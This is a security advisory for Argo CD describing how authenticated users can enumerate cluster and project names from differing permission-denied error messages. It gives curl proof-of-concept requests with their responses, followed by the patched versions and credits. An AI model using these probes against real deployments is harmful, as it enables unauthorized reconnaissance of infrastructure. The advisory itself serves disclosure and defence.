summary: "Argo-cd authenticated users can enumerate clusters by name\n### Impact\nIt’s possible\
  \ for authenticated users to enumerate clusters by name by inspecting error messages:\n\n\
  ```\n$ curl -k 'https://localhost:8080/api/v1/clusters/in-cluster?id.type=name' -H \"Authorization:\
  \ \nBearer $token\"\n{\"error\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\"\
  ,\"code\":7,\"message\":\"permission denied: clusters, get, , sub: alice, iat: 2022-11-04T20:25:44Z\"\
  }⏎                                 \n                                   \n$ curl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name'\
  \ -H \"Authorizati\non: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\"\
  :\"permission denied\"}\n```\n\nIt’s also possible to enumerate the names of projects with\
  \ project-scoped clusters if you know the names of the clusters.\n```\ncurl -k 'https://localhost:8080/api/v1/clusters/in-cluster-project?id.type=name'\
  \ -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied: clusters, get, default/,\
  \ sub: alice, iat: 2022-11-04T20:25:44Z\",\"code\":7,\"message\":\"permission denied: clusters,\
  \ get, default/, sub: alice, iat: 2022-11-04T20:25:44Z\"}\n\ncurl -k 'https://localhost:8080/api/v1/clusters/does-not-exist?id.type=name'\
  \ -H \"Authorization: Bearer $token\"\n{\"error\":\"permission denied\",\"code\":7,\"message\"\
  :\"permission denied\"}\n```\n\n### Patches\nA patch for this vulnerability has been released\
  \ in the following Argo CD versions:\n\nv2.11.3\nv2.10.12\nv2.9.17\n\n### For more information\n\
  If you have any questions or comments about this advisory:\n\nOpen an issue in [the Argo CD\
  \ issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n\
  Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n\
  Credits\nThis vulnerability was found & reported by @crenshaw-dev (Michael Crenshaw)\n\nThe\
  \ Argo team would like to thank these contributors for their responsible disclosure and constructive\
  \ communications during the resolve of this issue"
